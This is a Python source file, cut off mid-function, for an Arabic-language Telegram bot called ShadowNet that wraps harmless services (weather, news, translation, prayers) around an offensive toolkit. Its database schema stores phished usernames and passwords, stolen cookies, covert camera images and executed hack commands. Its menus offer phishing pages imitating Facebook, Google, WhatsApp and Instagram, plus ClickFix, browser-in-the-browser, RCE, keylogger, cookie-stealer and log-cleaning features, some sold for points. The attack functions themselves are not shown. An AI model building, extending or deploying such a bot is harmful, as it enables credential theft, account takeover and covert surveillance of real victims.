#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShadowNet v18.0 - النسخة النهائية (Webhook فقط)
تم إصلاح أخطاء global variables وإعادة هيكلة الكود
"""

# ===================== 1. IMPORTS =====================
import os
import sys
import time
import json
import logging
import re
import secrets
import string
import sqlite3
import hashlib
import subprocess
import platform
import socket
import threading
import random
import shutil
import smtplib
import base64
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote, unquote
from io import BytesIO
from collections import defaultdict
import functools
import queue
import signal
import asyncio
import ssl

# ===== الاستيرادات الخارجية =====
try:
    import requests
    from flask import Flask, request, jsonify, abort, render_template_string, send_file, Response, redirect, url_for
    from telebot import TeleBot
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone
    import dns.resolver
    import whois
    import yt_dlp
    from bs4 import BeautifulSoup
    import feedparser
    from deep_translator import GoogleTranslator
    from gtts import gTTS
    import psutil
    try:
        from PIL import Image, ImageDraw, ImageFont
        PIL_AVAILABLE = True
    except:
        PIL_AVAILABLE = False
    try:
        import paramiko
        PARAMIKO_AVAILABLE = True
    except:
        PARAMIKO_AVAILABLE = False
    try:
        import androguard
        from androguard.core.bytecodes.apk import APK
        ANDROGUARD_AVAILABLE = True
    except:
        ANDROGUARD_AVAILABLE = False
    try:
        import shodan
        SHODAN_AVAILABLE = True
    except:
        SHODAN_AVAILABLE = False
    try:
        import nmap
        NMAP_AVAILABLE = True
    except:
        NMAP_AVAILABLE = False
    try:
        from scapy.all import ARP, Ether, srp, send
        SCAPY_AVAILABLE = True
    except:
        SCAPY_AVAILABLE = False
    try:
        from impacket import smb, smbconnection, smbserver
        IMPACKET_AVAILABLE = True
    except:
        IMPACKET_AVAILABLE = False
except ImportError as e:
    print(f"مكتبة مفقودة: {e}. يرجى تثبيت: pip install -r requirements.txt")
    sys.exit(1)

# ===================== 2. CONFIG & GLOBALS =====================
TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
if not TOKEN:
    print("❌ خطأ: لم يتم تعيين TELEGRAM_BOT_TOKEN في متغيرات البيئة!")
    sys.exit(1)

ADMIN_ID = int(os.environ.get('ADMIN_ID', 7965377136))
SERVER_URL = os.environ.get('RENDER_EXTERNAL_URL', 'https://my-t99-bot.onrender.com')
PORT = int(os.environ.get('PORT', 5000))
API_KEY = secrets.token_hex(32)

SMTP_SERVER = os.environ.get('SMTP_SERVER', 'smtp.gmail.com')
SMTP_PORT = int(os.environ.get('SMTP_PORT', 587))
SMTP_USER = os.environ.get('SMTP_USER', '')
SMTP_PASS = os.environ.get('SMTP_PASS', '')

SHODAN_API_KEY = os.environ.get('SHODAN_API_KEY', '')

# المتغيرات العامة - يجب التصريح بها في بداية كل دالة تستخدمها
STEALTH_MODE = False
BOT_LOCKED = False

# ذاكرة التخزين المؤقت
CACHE_WEATHER = {}
CACHE_NEWS = {}
CACHE_EXPIRY = 600

# ===================== إنشاء الكائنات =====================
app = Flask(__name__)
bot = TeleBot(TOKEN, parse_mode='HTML')

# ===================== تعريف المتغيرات العامة =====================
user_states = {}
user_emails = {}
pdf_texts = {}
waiting_for_password = set()
waiting_for_image_prompt = set()
waiting_for_voice_text = set()
user_voice_selection = {}

# ===================== إعدادات التسجيل =====================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ===================== تعريف القوائم الأساسية =====================
QUOTES_DB = {
    "حكمة": ["لا تنتظر أن يأتيك أحد ويمنحك الفرصة، اصنعها بنفسك."],
    "تحفيز": ["توقف عن مقارنة بدايتك بنهاية غيرك."],
    "تفاؤل": ["مع كل يوم جديد تأتي فرصة جديدة."]
}
ADKAR_SABAH = ["أصبحنا وأصبح الملك لله..."]
ADKAR_MASSAA = ["أمسينا وأمسى الملك لله..."]
DUAA_DB = [{"title": "دعاء السفر", "text": "اللهم إنا نسألك في سفرنا هذا البر", "source": "صحيح مسلم"}]
VOICES = {"مصري": "ar", "مصرية": "ar", "سعودية": "ar"}
LANGUAGES = {
    'ar': 'عربي', 'en': 'إنجليزي', 'fr': 'فرنسي', 'es': 'إسباني',
    'de': 'ألماني', 'it': 'إيطالي', 'pt': 'برتغالي', 'ru': 'روسي',
    'ja': 'ياباني', 'ko': 'كوري', 'zh-cn': 'صيني مبسط', 'hi': 'هندي',
    'tr': 'تركي', 'fa': 'فارسي', 'ur': 'أردي'
}

# ===================== 3. DATABASE =====================
DB_PATH = 'shadownet.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        chat_id INTEGER PRIMARY KEY, is_admin INTEGER DEFAULT 0, is_banned INTEGER DEFAULT 0,
        points INTEGER DEFAULT 10, referral_code TEXT UNIQUE, created_at TEXT, last_seen TEXT,
        can_use_collector INTEGER DEFAULT 0, can_use_camera INTEGER DEFAULT 0,
        can_use_phishing INTEGER DEFAULT 0, can_use_advanced INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_tokens (chat_id INTEGER PRIMARY KEY, token TEXT UNIQUE)''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_activity (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER, action TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS points_log (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, reason TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS phishing_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, target_email TEXT, platform TEXT, username TEXT, password TEXT, ip TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS reminders (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER, message TEXT, remind_time TEXT, created_at TEXT, is_active INTEGER DEFAULT 1)''')
    c.execute('''CREATE TABLE IF NOT EXISTS short_urls (id INTEGER PRIMARY KEY AUTOINCREMENT, original_url TEXT, short_code TEXT UNIQUE, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS cookie_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT, cookies TEXT, ip TEXT, user_agent TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS camera_images (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER, image BLOB, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_cookies (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, url TEXT, cookie_name TEXT, cookie_value TEXT, technique TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS collected_data (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, data_type TEXT, data TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS scan_results (id INTEGER PRIMARY KEY AUTOINCREMENT, target TEXT, scan_type TEXT, results TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS targets (device_id TEXT PRIMARY KEY, name TEXT, type TEXT, ip TEXT, os TEXT, status TEXT, last_seen TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS hack_files (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, filename TEXT, content BLOB, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS hack_commands (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, command TEXT, output TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS reverse_proxy_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, url TEXT, cookie_name TEXT, cookie_value TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS clickfix_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, command TEXT, executed INTEGER DEFAULT 0, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS account_dumpling_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, target_email TEXT, platform TEXT, status TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS vuln_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, target TEXT, results TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS osint_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, target TEXT, results TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS netrecon_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, target TEXT, results TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS exploit_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, target TEXT, results TEXT, created_at TEXT)''')
    try:
        c.execute("ALTER TABLE users ADD COLUMN can_use_camera INTEGER DEFAULT 0")
        c.execute("ALTER TABLE users ADD COLUMN can_use_phishing INTEGER DEFAULT 0")
        c.execute("ALTER TABLE users ADD COLUMN can_use_advanced INTEGER DEFAULT 0")
    except:
        pass
    c.execute("INSERT OR IGNORE INTO users (chat_id, is_admin, points, created_at, can_use_collector, can_use_camera, can_use_phishing, can_use_advanced) VALUES (?, 1, 999, ?, 1, 1, 1, 1)",
              (ADMIN_ID, datetime.now().isoformat()))
    c.execute("UPDATE users SET is_admin = 1 WHERE chat_id = ?", (ADMIN_ID,))
    conn.commit()
    conn.close()

init_db()

# ===================== دوال مساعدة =====================
def is_admin(chat_id):
    row = safe_db_query("SELECT is_admin FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def is_banned(chat_id):
    row = safe_db_query("SELECT is_banned FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def get_user_points(chat_id):
    row = safe_db_query("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
    return row[0] if row else 0

def user_can_use_collector(chat_id):
    row = safe_db_query("SELECT can_use_collector FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def user_can_use_camera(chat_id):
    row = safe_db_query("SELECT can_use_camera FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def user_can_use_phishing(chat_id):
    row = safe_db_query("SELECT can_use_phishing FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def user_can_use_advanced(chat_id):
    row = safe_db_query("SELECT can_use_advanced FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def add_points(chat_id, amount, reason):
    if safe_db_execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (amount, chat_id)):
        safe_db_execute("INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
                        (chat_id, amount, reason, datetime.now().isoformat()))

def deduct_points(chat_id, amount, reason):
    points = get_user_points(chat_id)
    if points < amount:
        return False
    if safe_db_execute("UPDATE users SET points = points - ? WHERE chat_id = ?", (amount, chat_id)):
        safe_db_execute("INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
                        (chat_id, -amount, reason, datetime.now().isoformat()))
        return True
    return False

def safe_db_query(query, params=(), fetch_one=True, default=None):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(query, params)
        if fetch_one:
            result = c.fetchone()
        else:
            result = c.fetchall()
        conn.close()
        return result if result is not None else default
    except Exception as e:
        logger.error(f"خطأ في قاعدة البيانات: {e}")
        return default

def safe_db_execute(query, params=()):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(query, params)
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"خطأ في تنفيذ قاعدة البيانات: {e}")
        return False

def safe_send(chat_id, text, reply_markup=None, parse_mode='HTML'):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=parse_mode, timeout=60)
    except Exception as e:
        logger.error(f"safe_send error: {e}")
        return None

def notify_admin(msg):
    safe_send(ADMIN_ID, f"📢 إشعار: {msg}")

def log_activity(chat_id, action):
    safe_db_execute("INSERT INTO user_activity (chat_id, action, timestamp) VALUES (?, ?, ?)",
                    (chat_id, action, datetime.now().isoformat()))

def update_last_seen(chat_id):
    safe_db_execute("UPDATE users SET last_seen = ? WHERE chat_id = ?", (datetime.now().isoformat(), chat_id))

def get_user_name(chat_id):
    try:
        user = bot.get_chat(chat_id)
        return user.first_name or user.username or str(chat_id)
    except:
        return str(chat_id)

def force_kill_old_instances():
    """قتل أي نسخة قديمة من البوت باستخدام psutil"""
    current_pid = os.getpid()
    current_file = os.path.abspath(__file__)
    killed = 0
    try:
        for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'exe']):
            try:
                if proc.info['pid'] == current_pid:
                    continue
                cmdline = ' '.join(proc.info['cmdline'] or [])
                if 'python' in proc.info['name'].lower() and current_file in cmdline:
                    logger.warning(f"🔪 Killing old bot process: PID {proc.info['pid']}")
                    proc.kill()
                    killed += 1
                    time.sleep(1)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
    except Exception as e:
        logger.error(f"Error killing old instances: {e}")
    return killed

# ===================== 4. KEYBOARDS / MENUS =====================
def build_main_menu(chat_id):
    markup = InlineKeyboardMarkup(row_width=2)
    # ===== الخدمات العامة =====
    markup.row(InlineKeyboardButton("🌤️ حالة الطقس", callback_data="weather"), InlineKeyboardButton("📚 ويكيبيديا", callback_data="wikipedia"))
    markup.row(InlineKeyboardButton("🔑 مولد كلمات المرور", callback_data="password_gen"), InlineKeyboardButton("🔐 تحليل كلمات المرور", callback_data="password_strength"))
    markup.row(InlineKeyboardButton("🎤 تحويل نص لصوت", callback_data="voice_gtts_menu"), InlineKeyboardButton("🌐 الترجمة", callback_data="translate"))
    markup.row(InlineKeyboardButton("⏰ التذكير", callback_data="reminder"), InlineKeyboardButton("📰 الأخبار", callback_data="news"))
    markup.row(InlineKeyboardButton("🔗 تقصير الروابط", callback_data="shorten_url"), InlineKeyboardButton("🔗 فك الروابط", callback_data="expand_url"))
    # ===== أدوات التجميع =====
    if user_can_use_collector(chat_id) or is_admin(chat_id):
        markup.row(InlineKeyboardButton("📱 معلومات الجهاز", callback_data="device_info"), InlineKeyboardButton("📷 كاميرا أمامية", callback_data="camera_hack"))
    if user_can_use_advanced(chat_id) or is_admin(chat_id):
        markup.row(InlineKeyboardButton("🍪 استخراج الكوكيز", callback_data="cookie_stealer"), InlineKeyboardButton("📱 تتبع رقم الهاتف", callback_data="track_phone"))
    markup.row(InlineKeyboardButton("📹 مكالمة فيديو", callback_data="video_call"), InlineKeyboardButton("💬 اقتباسات", callback_data="quotes_menu"))
    markup.row(InlineKeyboardButton("🔍 فحص الروابط", callback_data="check_link_btn"), InlineKeyboardButton("📦 تحليل APK", callback_data="analyze_apk"))
    markup.row(InlineKeyboardButton("📄 تحليل PDF", callback_data="pdf_menu"), InlineKeyboardButton("🎨 توليد صور AI", callback_data="generate_image_btn"))
    markup.row(InlineKeyboardButton("📧 بريد مؤقت", callback_data="create_email_btn"), InlineKeyboardButton("💎 نقاطي", callback_data="my_points"))
    markup.row(InlineKeyboardButton("🔗 رابط الدعوة", callback_data="my_referral"), InlineKeyboardButton("📜 سجل النقاط", callback_data="points_history"))
    # ===== أدوات الهجمات =====
    markup.row(InlineKeyboardButton("🎯 ClickFix", callback_data="clickfix_generator"))
    markup.row(InlineKeyboardButton("📧 AccountDumpling", callback_data="account_dumpling"))
    markup.row(InlineKeyboardButton("🪟 BitB", callback_data="bitb_attack"))
    markup.row(InlineKeyboardButton("🔑 ConsentFix", callback_data="consentfix_attack"))
    markup.row(InlineKeyboardButton("📱 BTMOB", callback_data="btmob_attack"))
    markup.row(InlineKeyboardButton("📥 تنزيل فيديو", callback_data="download_video"))
    # ===== أدوات المطور =====
    if is_admin(chat_id):
        markup.row(InlineKeyboardButton("🔍 vuln-agent", callback_data="vuln_agent"))
        markup.row(InlineKeyboardButton("🕵️ osint-d2", callback_data="osint_d2"))
        markup.row(InlineKeyboardButton("🌐 Py-NetRecon", callback_data="py_netrecon"))
        markup.row(InlineKeyboardButton("💀 Exploit-Dev", callback_data="exploit_dev"))
        markup.row(InlineKeyboardButton("📧 H4X-Tools", callback_data="h4x_tools"))
        markup.row(InlineKeyboardButton("🛡️ Matkap", callback_data="matkap"))
        markup.row(InlineKeyboardButton("🐍 Pentest Tools", callback_data="pentest_tools"))
    # ===== التصيد =====
    if user_can_use_phishing(chat_id) or is_admin(chat_id):
        markup.row(InlineKeyboardButton("🎣 صفحات تصيد", callback_data="phishing_pages"), InlineKeyboardButton("📧 بريد تصيد", callback_data="phishing_email"))
    else:
        markup.row(InlineKeyboardButton("🔒 صفحات تصيد (300 نقطة)", callback_data="phishing_locked"))
    # ===== لوحة التحكم =====
    if is_admin(chat_id):
        markup.row(InlineKeyboardButton("⚙️ لوحة التحكم", callback_data="admin_panel"))
        markup.row(InlineKeyboardButton("🖥️ RCE", callback_data="rce_menu"), InlineKeyboardButton("🔑 Keylogger", callback_data="keylogger_menu"))
        markup.row(InlineKeyboardButton("🛡️ الحماية", callback_data="protection_menu"), InlineKeyboardButton("👥 إدارة المستخدمين", callback_data="admin_users"))
    markup.row(InlineKeyboardButton("⬅️", callback_data="back_main"))
    return markup

def build_phishing_pages_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("فيسبوك", callback_data="phish_facebook"), InlineKeyboardButton("جوجل", callback_data="phish_google"))
    markup.row(InlineKeyboardButton("واتساب", callback_data="phish_whatsapp"), InlineKeyboardButton("تويتر", callback_data="phish_twitter"))
    markup.row(InlineKeyboardButton("انستغرام", callback_data="phish_instagram"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_phishing_platform_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("فيسبوك", callback_data="phish_platform_facebook"), InlineKeyboardButton("جوجل", callback_data="phish_platform_google"))
    markup.row(InlineKeyboardButton("واتساب", callback_data="phish_platform_whatsapp"), InlineKeyboardButton("تويتر", callback_data="phish_platform_twitter"))
    markup.row(InlineKeyboardButton("انستغرام", callback_data="phish_platform_instagram"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_quotes_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    for cat in QUOTES_DB.keys():
        markup.row(InlineKeyboardButton(cat, callback_data=f"quote_cat_{cat}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_voice_gtts_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    for voice_name in VOICES.keys():
        markup.row(InlineKeyboardButton(f"🎤 {voice_name}", callback_data=f"voice_gtts_{voice_name}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_pdf_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("تلخيص PDF", callback_data="pdf_summary"), InlineKeyboardButton("استخراج نصوص", callback_data="pdf_extract"))
    markup.row(InlineKeyboardButton("تحليل ذكي", callback_data="pdf_smart"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_translate_menu():
    markup = InlineKeyboardMarkup(row_width=3)
    languages = list(LANGUAGES.items())
    for i in range(0, len(languages), 3):
        row = []
        for code, name in languages[i:i+3]:
            row.append(InlineKeyboardButton(name, callback_data=f"trans_lang_{code}"))
        markup.row(*row)
    markup.row(InlineKeyboardButton("إلغاء", callback_data="back_main"))
    return markup

def build_admin_panel():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("الإحصائيات", callback_data="admin_stats"), InlineKeyboardButton("البث الجماعي", callback_data="admin_broadcast"))
    markup.row(InlineKeyboardButton("قائمة المستخدمين", callback_data="admin_users"), InlineKeyboardButton("التقارير", callback_data="admin_reports"))
    markup.row(InlineKeyboardButton("إدارة النقاط", callback_data="admin_points_menu"), InlineKeyboardButton("إدارة الحظر", callback_data="admin_ban_menu"))
    markup.row(InlineKeyboardButton("سجل التصيد", callback_data="admin_phishing_logs"), InlineKeyboardButton("إدارة الصلاحيات", callback_data="admin_permissions"))
    markup.row(InlineKeyboardButton("قفل الدردشة", callback_data="lock_chat"), InlineKeyboardButton("إرسال رسالة", callback_data="send_to_user"))
    markup.row(InlineKeyboardButton("سجل النشاطات", callback_data="user_activity"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_protection_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("درع الحماية", callback_data="protect_shield"), InlineKeyboardButton("قفل البوت", callback_data="protect_lock"))
    markup.row(InlineKeyboardButton("تخفي شامل", callback_data="protect_stealth"), InlineKeyboardButton("كشف الاختراق", callback_data="protect_detect"))
    markup.row(InlineKeyboardButton("تغيير الهوية", callback_data="protect_identity"), InlineKeyboardButton("تنظيف السجلات", callback_data="protect_clean"))
    markup.row(InlineKeyboardButton("نسخ احتياطي", callback_data="protect_backup"), InlineKeyboardButton("إعادة تشغيل آمن", callback_data="protect_reboot"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_doaa_menu():
    markup = InlineKeyboardMarkup(row_width=1)
    for i, duaa in enumerate(DUAA_DB):
        markup.row(InlineKeyboardButton(duaa['title'], callback_data=f"doaa_{i}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_muslim_menu():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.row(InlineKeyboardButton("أركان الإسلام", callback_data="muslim_arkan_islam"))
    markup.row(InlineKeyboardButton("أركان الإيمان", callback_data="muslim_arkan_iman"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_users_menu(chat_id, action):
    users = safe_db_query("SELECT chat_id, is_admin, is_banned, points FROM users", fetch_one=False)
    if not users:
        return None, "لا يوجد مستخدمين"
    markup = InlineKeyboardMarkup(row_width=1)
    for user in users:
        user_id = user[0]
        name = get_user_name(user_id)
        status = "🟢" if user[2] == 0 else "🔴"
        label = f"{name} ({user_id}) - {status} - نقاط: {user[3]}"
        markup.row(InlineKeyboardButton(label, callback_data=f"{action}_user_{user_id}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup, None

# ===================== نهاية الجزء الأول =====================
# ===================== 5. API FUNCTIONS =====================
# دوال الخدمات العامة
def get_weather_detailed(city):
    if city in CACHE_WEATHER and time.time() - CACHE_WEATHER[city]['time'] < CACHE_EXPIRY:
        return CACHE_WEATHER[city]['data']
    try:
        url = f"https://wttr.in/{city}?format=j1&lang=ar"
        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            current = data.get('current_condition', [{}])[0]
            weather_desc = current.get('weatherDesc', [{}])[0].get('value', 'غير معروف')
            temp_c = current.get('temp_C', 'غير معروف')
            feels_like = current.get('FeelsLikeC', 'غير معروف')
            humidity = current.get('humidity', 'غير معروف')
            wind_speed = current.get('windSpeedKmph', 'غير معروف')
            pressure = current.get('pressure', 'غير معروف')
            visibility = current.get('visibility', 'غير معروف')
            uv_index = current.get('uvIndex', 'غير معروف')
            forecast = data.get('weather', [{}])[0]
            max_temp = forecast.get('maxtempC', 'غير معروف')
            min_temp = forecast.get('mintempC', 'غير معروف')
            sunrise = forecast.get('astronomy', [{}])[0].get('sunrise', 'غير معروف')
            sunset = forecast.get('astronomy', [{}])[0].get('sunset', 'غير معروف')
            now = datetime.now().strftime("%I:%M %p")
            msg = f"🌤️ حالة الطقس في {city}\n────────────────────────\n\nالحالة العامة : {weather_desc}\n\nدرجة الحرارة : {temp_c} درجة مئوية\nالحرارة المحسوسة : {feels_like} درجة مئوية\n\nتفاصيل الأجواء\n────────────────────────\nالمدى الحراري : الصغرى {min_temp}°C | العظمى {max_temp}°C\nالرطوبة       : {humidity}%\nسرعة الرياح    : {wind_speed} كم/ساعة\nمؤشر الأشعة    : {uv_index}\nالرؤية         : {visibility} كم\nالضغط الجوي    : {pressure} hPa\n\nأوقات اليوم\n────────────────────────\nشروق الشمس : {sunrise}\nغروب الشمس : {sunset}\n\nآخر تحديث : {now}"
            CACHE_WEATHER[city] = {'data': msg, 'time': time.time()}
            return msg
        else:
            return "فشل جلب الطقس، يرجى التحقق من اسم المدينة."
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def get_news_without_api(topic='general'):
    if topic in CACHE_NEWS and time.time() - CACHE_NEWS[topic]['time'] < CACHE_EXPIRY:
        return CACHE_NEWS[topic]['data']
    try:
        rss_feeds = {
            'general': 'https://www.aljazeera.net/feeds/rss',
            'egypt': 'https://www.youm7.com/RSS',
            'sport': 'http://www.kooora.com/rss.aspx',
            'tech': 'https://www.aitnews.com/feed',
            'economy': 'https://www.alarabiya.net/ar/economy/rss.xml',
            'world': 'https://www.bbc.com/arabic/index.xml',
            'science': 'https://www.nature.com/nature.rss',
        }
        feed_url = rss_feeds.get(topic, rss_feeds['general'])
        feed = feedparser.parse(feed_url)
        articles = []
        if feed.entries:
            for entry in feed.entries[:10]:
                title = entry.get('title', '').strip()
                summary = entry.get('summary', '') or entry.get('description', '')
                summary = re.sub(r'<[^>]+>', '', summary)
                link = entry.get('link', '')
                published = entry.get('published', '')
                try:
                    pub_date = datetime(*entry.published_parsed[:6]).strftime("%Y-%m-%d %H:%M")
                except:
                    pub_date = "تاريخ غير معروف"
                articles.append(f"📌 {title}\n📅 {pub_date}\n{summary[:250]}...\n🔗 {link}\n")
            if articles:
                result = "\n".join(articles[:8])
                CACHE_NEWS[topic] = {'data': result, 'time': time.time()}
                return result
        return "لا توجد أخبار"
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def advanced_wikipedia_search(query):
    try:
        import wikipedia
        wikipedia.set_lang("ar")
        results = wikipedia.search(query, results=10)
        if not results:
            return "لم يتم العثور على نتائج"
        summaries = []
        for title in results[:5]:
            try:
                page = wikipedia.page(title)
                summary = page.summary[:500] + "..."
                url = page.url
                summaries.append(f"📌 {title}\n{summary}\n🔗 {url}\n")
            except wikipedia.exceptions.DisambiguationError as e:
                options = e.options[:5]
                summaries.append(f"📌 {title} (توجد عدة صفحات):\n" + "\n".join([f"• {opt}" for opt in options]))
            except:
                summaries.append(f"📌 {title}\n(لا يمكن جلب الملخص)\n")
        if summaries:
            return "\n".join(summaries)
        return "لم يتم العثور على نتائج"
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def translate_text_advanced_with_lang(text, target_lang='ar'):
    try:
        translator = GoogleTranslator(source='auto', target=target_lang)
        translated = translator.translate(text)
        return [translated], 'auto', 'تلقائي', LANGUAGES.get(target_lang, target_lang)
    except Exception as e:
        return [text], 'unknown', 'غير معروف', 'غير معروف'

def generate_strong_password():
    chars = string.ascii_letters + string.digits + "!@#$%"
    while True:
        pwd = ''.join(random.choice(chars) for _ in range(14))
        if re.search(r"[A-Z]", pwd) and re.search(r"[a-z]", pwd) and re.search(r"[0-9]", pwd) and re.search(r"[!@#$%]", pwd):
            return pwd

def analyze_password(password):
    score, feedback = 0, []
    if len(password) >= 12: score += 2
    elif len(password) >= 8: score += 1
    else: feedback.append("قصيرة جداً. خليها 12 حرف على الاقل")
    if re.search(r"[A-Z]", password): score += 1
    else: feedback.append("اضف حرف كبير A-Z")
    if re.search(r"[a-z]", password): score += 1
    else: feedback.append("اضف حرف صغير a-z")
    if re.search(r"[0-9]", password): score += 1
    else: feedback.append("اضف ارقام 0-9")
    if re.search(r"[!@#$%^&*]", password): score += 1
    else: feedback.append("اضف رمز!@#$%")
    if score <= 2: strength, time_taken = "ضعيفة جداً 🔴", "اقل من ثانية"
    elif score <= 4: strength, time_taken = "متوسطة 🟡", "عدة ساعات"
    else: strength, time_taken = "قوية جداً 🟢", "مليارات السنين"
    return strength, time_taken, score, feedback

def generate_image(prompt):
    try:
        url = f"https://image.pollinations.ai/prompt/{prompt}?width=1024&height=1024&nologo=true"
        response = requests.get(url, timeout=30)
        if response.status_code == 200:
            return BytesIO(response.content)
        return None
    except Exception as e:
        logger.error(f"Image generation error: {e}")
        return None

def generate_voice_gtts(text, lang='ar'):
    try:
        tts = gTTS(text=text, lang=lang, slow=False)
        voice_bytes = BytesIO()
        tts.write_to_fp(voice_bytes)
        voice_bytes.seek(0)
        return voice_bytes
    except Exception as e:
        logger.error(f"gTTS error: {e}")
        return None

def shorten_url(url):
    try:
        code = hashlib.md5(url.encode()).hexdigest()[:8]
        safe_db_execute("INSERT INTO short_urls (original_url, short_code, created_at) VALUES (?, ?, ?)", (url, code, datetime.now().isoformat()))
        return f"{SERVER_URL}/s/{code}"
    except Exception as e:
        return None

def expand_url(short_url):
    try:
        code = short_url.split('/')[-1]
        row = safe_db_query("SELECT original_url FROM short_urls WHERE short_code = ?", (code,))
        if row:
            return row[0]
        return None
    except:
        return None

def track_phone_number(number):
    try:
        parsed = phonenumbers.parse(number, None)
        country = geocoder.description_for_number(parsed, "ar")
        carrier_name = carrier.name_for_number(parsed, "ar")
        timezones = timezone.time_zones_for_number(parsed)
        return f"📱 معلومات الرقم {number}:\nالبلد: {country}\nالمشغل: {carrier_name}\nالمناطق الزمنية: {', '.join(timezones)}"
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def download_video(url):
    try:
        os.makedirs('downloads', exist_ok=True)
        ydl_opts = {'outtmpl': 'downloads/%(title)s.%(ext)s', 'format': 'best[ext=mp4]/best', 'quiet': True, 'no_warnings': True, 'ignoreerrors': True, 'no_check_certificate': True}
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
